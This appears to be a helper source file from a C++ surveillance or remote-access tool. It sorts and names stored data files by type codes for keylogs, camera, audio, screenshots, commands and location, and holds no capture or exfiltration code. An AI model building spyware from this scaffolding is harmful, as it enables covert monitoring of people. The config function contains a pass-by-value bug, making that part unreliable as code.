#include "TasksHelper.h"

DWORD buildFilterPath(wstring finalFilterPath, map<string, string> configs, map<string, string>::iterator configsIter, const char* type) {
	if (configsIter != configs.end()) {
		if (configsIter->second == "true")
			finalFilterPath.append(stringToWString(type));
	}
	else
		return 0; // invalid config file
	return 1;
}


string checkDataType(char* filename)
{
	const char id[3] = { filename[0],filename[1] , '\0' };

	if (!strcmp(id, KEYLOG_CODE))
		return Keylog;
	else if (!strcmp(id, CAMERA_CODE))
		return Camera;
	else if (!strcmp(id, AUDIO_CODE))
		return Audio;
	else if (!strcmp(id, SCREENSHOT_CODE))
		return Screenshot;
	else if (!strcmp(id, CMD_CODE))
		return Command;
	else if (!strcmp(id, LOCATION_CODE))
		return Location;
	return UNDEFINED_CODE;
}
string getRandomString(const int len) {
	const char alphanum[] =
		"0123456789"
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
		"abcdefghijklmnopqrstuvwxyz";
	string tmp_s;
	tmp_s.reserve(len);

	for (int i = 0; i < len; ++i) {
		tmp_s += alphanum[rand() % (sizeof(alphanum) - 1)];
	}
	return tmp_s;
}

string constructFilename(const char* typeCode) {
	// Get time and date
	time_t rawtime;
	struct tm* timeinfo;
	time(&rawtime);
	timeinfo = localtime(&rawtime);
	char dateString[80];

	// Get the date as a string
	strftime(dateString, sizeof(dateString), "-%d-%m-%Y-%H-%M-%S-", timeinfo);
	string fname = "";
	fname.append(DATA_FOLDER_PATH).append(typeCode).append(dateString).append(getRandomString(10));
	return fname;
}
